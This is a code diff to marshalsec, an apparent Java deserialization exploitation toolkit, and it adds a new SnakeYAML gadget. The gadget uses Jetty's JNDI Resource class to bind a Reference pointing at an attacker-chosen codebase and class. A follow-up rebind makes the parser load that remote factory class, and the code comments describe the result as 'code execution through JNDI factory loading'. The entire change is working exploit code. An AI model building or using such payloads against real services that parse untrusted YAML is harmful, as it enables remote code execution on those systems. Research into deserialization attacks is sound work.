@@ -38,6 +38,7 @@ import org.apache.commons.configuration.ConfigurationMap;
 import org.apache.commons.configuration.JNDIConfiguration;
 import org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding;
 import org.apache.xbean.naming.context.WritableContext;
+import org.eclipse.jetty.plus.jndi.Resource;
 import org.springframework.beans.factory.config.PropertyPathFactoryBean;
 import org.springframework.jndi.support.SimpleJndiBeanFactory;
 import org.yaml.snakeyaml.Yaml;
@@ -47,6 +48,7 @@ import marshalsec.gadgets.C3P0RefDataSource;
 import marshalsec.gadgets.C3P0WrapperConnPool;
 import marshalsec.gadgets.CommonsConfiguration;
 import marshalsec.gadgets.JdbcRowSet;
+import marshalsec.gadgets.ResourceGadget;
 import marshalsec.gadgets.ScriptEngine;
 import marshalsec.gadgets.SpringAbstractBeanFactoryPointcutAdvisor;
 import marshalsec.gadgets.SpringPropertyPathFactory;
@@ -65,7 +67,7 @@ import marshalsec.gadgets.XBean;
  *
  */
 public class SnakeYAML extends YAMLBase implements ScriptEngine, JdbcRowSet, CommonsConfiguration, C3P0RefDataSource, C3P0WrapperConnPool,
-        SpringPropertyPathFactory, SpringAbstractBeanFactoryPointcutAdvisor, XBean {
+        SpringPropertyPathFactory, SpringAbstractBeanFactoryPointcutAdvisor, XBean, ResourceGadget {
 
     /**
      * {@inheritDoc}
@@ -172,6 +174,31 @@ public class SnakeYAML extends YAMLBase implements ScriptEngine, JdbcRowSet, Com
                 writeString("foo"),
                 writeConstructor(Reference.class, true, "foo", writeString(args[ 1 ]), writeString(args[ 0 ])),
                 writeConstructor(WritableContext.class, true)));
+    }
+
+
+    @Override
+    @Args ( minArgs = 2, args = {
+        "codebase", "classname"
+    }, defaultArgs = {
+        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
+    } )
+    public Object makeResource ( UtilFactory uf, String[] args ) throws Exception {
+        return writeArray(
+            // bind to __/obj, this is actually the location where the NamingEntry for 'obj' would be stored
+            // (which now is stored at __/__/obj)
+            writeConstructor(
+                Resource.class,
+                true,
+                writeString("__/obj"),
+                // usual reference setup
+                writeConstructor(Reference.class, true, writeString("foo"), writeString(args[ 1 ]), writeString(args[ 0 ]))),
+
+            // rebind compound name subresource
+            // this first tries to rebind the NamingEntry at the compound name __/obj/test
+            // the lookup of the intermediate context __/obj yields the Reference bound before
+            // --> code execution through JNDI factory loading
+            writeConstructor(Resource.class, true, writeString("obj/test"), writeConstructor(Object.class, true)));
     }
 
 
